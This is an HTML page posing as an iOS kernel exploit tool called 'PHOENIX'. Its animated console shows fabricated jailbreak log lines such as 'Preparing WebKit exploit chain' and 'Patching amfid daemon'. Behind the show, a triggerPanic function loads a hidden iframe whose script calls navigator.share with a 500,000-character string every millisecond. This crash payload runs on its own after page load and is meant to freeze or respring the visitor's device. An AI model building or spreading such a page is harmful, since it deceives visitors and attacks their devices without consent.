<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PHOENIX: Injecting</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Mono", monospace;
            margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;
            background: #000; color: #ff3b30; overflow: hidden; position: relative;
        }

        body::after {
            content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyIiBoZWlnaHQ9IjIiIHZpZXdCb3g9IjAgMCAyIDIiPjxnPjxjaXJjbGUgY3g9IjEiIGN5PSIxIiByPSIxIiBmaWxsPSJyZ2JhKDI1NSwyNTUsMjU1LDAuMDUpIi8+PC9nPjwvc3ZnPg==');
            background-repeat: repeat; opacity: 0.15; pointer-events: none; z-index: 1;
        }

        #rainCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; display: none; }

        .main-card {
            background: rgba(0, 0, 0, 0.95); 
            backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 59, 48, 0.3); border-radius: 12px; 
            padding: 35px 25px; width: 85%; max-width: 360px; text-align: center; 
            box-shadow: 0 40px 120px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255, 59, 48, 0.1);
            z-index: 10; position: relative;
        }

        .status-header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 20px; font-size: 9px; text-transform: uppercase; color: #555;
            font-family: 'SF Mono', monospace; letter-spacing: 1px;
        }

        .live-indicator { display: flex; align-items: center; gap: 5px; color: #ff3b30; font-weight: bold; }
        .dot { width: 4px; height: 4px; background: #ff3b30; border-radius: 50%; animation: pulse 1s infinite; box-shadow: 0 0 5px #ff3b30; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }

        h1 {
            font-size: 1.5rem; font-weight: 900; text-transform: uppercase; letter-spacing: 2px;
            margin: 0 0 5px 0; line-height: 1.1; color: #fff;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
        }

        .patient-msg { 
            font-size: 10px; color: #ff3b30; margin-bottom: 20px; 
            font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px;
            text-shadow: 0 0 10px rgba(255, 59, 48, 0.3);
        }

        .progress-container { background: rgba(255, 59, 48, 0.05); border-radius: 4px; height: 4px; width: 100%; margin-bottom: 20px; overflow: hidden; border: 1px solid rgba(255, 59, 48, 0.1); }
        .progress-bar { width: 0%; height: 100%; background: #ff3b30; box-shadow: 0 0 15px rgba(255, 59, 48, 0.4); }

        #console {
            background: rgba(0, 0, 0, 0.8); border-radius: 8px; padding: 18px; height: 180px;
            font-family: 'SF Mono', monospace; font-size: 10px; color: #fff;
            text-align: left; overflow: hidden; border: 1px solid rgba(255, 59, 48, 0.1);
            line-height: 1.5;
        }

        .line { margin-bottom: 4px; opacity: 0; animation: fadeIn 0.1s forwards; }
        @keyframes fadeIn { to { opacity: 1; } }

        .footer-tag { margin-top: 20px; font-size: 9px; color: #222; text-transform: uppercase; letter-spacing: 1px; }
        #panic-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; color: #fff; font-size: 7px; overflow: hidden; word-break: break-all;}
    </style>
</head>
<body>
    <canvas id="rainCanvas"></canvas>

    <div class="main-card">
        <div class="status-header">
            <div class="live-indicator"><div class="dot"></div> INJECTING PAYLOAD</div>
            <div id="bitrate">0.0 MB/s</div>
        </div>
        
        <h1>Exploiting Kernel</h1>
        <div class="patient-msg">Protocol: Phoenix is active. Do not interrupt.</div>
        
        <div class="progress-container"><div id="bar" class="progress-bar"></div></div>
        
        <div id="console"></div>

        <div class="footer-tag">Authorized repository: Vitya</div>
    </div>

    <div id="panic-screen"></div>
    <iframe id="respring-iframe" style="display:none"></iframe>

    <script>
        // ДИНАМИКА ТЕРМИНАЛА И БИТРЕЙТА
        setInterval(() => {
            document.getElementById('bitrate').innerText = (Math.random() * 20 + 5).toFixed(1) + " MB/s";
        }, 150);

        const logs = [
            "> Verifying node challenge...",
            "> Connection: SECURE (TLS 1.3)",
            "> Preparing WebKit exploit chain...",
            "> Escalating privileges...",
            "> CoreSlide: 0x400000 -> 0x41C000",
            "> Patching amfid daemon...",
            "> Remounting root filesystem...",
            "> Stage 3: Post-exploitation...",
            "> CRITICAL: KTR Bypass Failed",
            "> Triggering memory panic..."
        ];

        let barW = 0;
        const bar = document.getElementById('bar');
        const consoleEl = document.getElementById('console');

        const interval = setInterval(() => {
            barW += 0.9;
            bar.style.width = Math.min(barW, 100) + "%";
            if (barW >= 100) clearInterval(interval);
        }, 35);

        function startLogs(i) {
            if (i < logs.length) {
                const div = document.createElement('div');
                div.className = 'line';
                div.innerText = logs[i];
                consoleEl.appendChild(div);
                consoleEl.scrollTop = consoleEl.scrollHeight;
                setTimeout(() => startLogs(i + 1), Math.random() * 500 + 200);
            } else {
                setTimeout(triggerPanic, 500);
            }
        }

        function triggerPanic() {
            document.getElementById('panic-screen').style.display = 'block';
            document.getElementById('respring-iframe').srcdoc = "<html><body><script>setInterval(()=>navigator.share({title:'X'.repeat(500000)}),1)<\/script></body></html>";
        }

        setTimeout(() => startLogs(0), 1000);
    </script>
</body>
</html>
